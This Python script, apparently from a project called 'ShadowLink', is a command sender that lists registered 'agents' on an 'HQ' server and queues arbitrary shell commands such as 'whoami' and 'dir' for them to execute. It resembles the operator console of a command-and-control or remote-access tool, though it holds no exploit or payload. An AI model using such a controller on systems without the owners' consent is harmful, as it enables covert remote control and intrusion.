"""
Command Sender Utility
Send commands to agents via HQ server
"""

import requests
import json
import sys
import uuid
from datetime import datetime

HQ_URL = "http://localhost:5000"

def send_command(agent_id, command_type, payload):
    """Send a command to an agent"""
    
    command_id = str(uuid.uuid4())[:8]
    
    try:
        response = requests.post(
            f"{HQ_URL}/send-command/{agent_id}",
            json={
                'command_id': command_id,
                'command_type': command_type,
                'payload': payload
            },
            timeout=5
        )
        response.raise_for_status()
        data = response.json()
        
        print(f"\n✓ Command queued successfully!")
        print(f"  Agent ID: {agent_id}")
        print(f"  Command ID: {command_id}")
        print(f"  Type: {command_type}")
        print(f"  Payload: {json.dumps(payload)}")
        
    except requests.exceptions.RequestException as e:
        print(f"✗ Error sending command: {e}")

def list_agents():
    """List all registered agents"""
    try:
        response = requests.get(f"{HQ_URL}/agents", timeout=5)
        response.raise_for_status()
        data = response.json()
        agents = data.get('agents', [])
        
        print(f"\n{'Agent ID':<15} {'Status':<10} {'Last Heartbeat':<25} {'Registered':<25}")
        print("-" * 75)
        
        for agent in agents:
            agent_id = agent.get('agent_id', 'N/A')
            status = agent.get('status', 'N/A')
            last_hb = agent.get('last_heartbeat', 'N/A')[-8:]  # Show time part
            registered = agent.get('registered_at', 'N/A')[-8:]
            
            print(f"{agent_id:<15} {status:<10} {last_hb:<25} {registered:<25}")
        
        return agents
    except requests.exceptions.RequestException as e:
        print(f"Error listing agents: {e}")
        return []

def main():
    """Main CLI"""
    
    if len(sys.argv) < 2:
        print("ShadowLink Command Sender")
        print("\nUsage:")
        print("  python send_command.py list           - List all agents")
        print("  python send_command.py send <agent_id> <command>")
        print("\nExamples:")
        print("  python send_command.py list")
        print("  python send_command.py send agent_001 'whoami'")
        print("  python send_command.py send agent_001 'dir'")
        return
    
    command = sys.argv[1]
    
    if command == "list":
        list_agents()
    elif command == "send":
        if len(sys.argv) < 4:
            print("Usage: python send_command.py send <agent_id> <command>")
            return
        
        agent_id = sys.argv[2]
        cmd = sys.argv[3]
        
        send_command(agent_id, "exec", {"command": cmd})
    else:
        print(f"Unknown command: {command}")

if __name__ == "__main__":
    main()
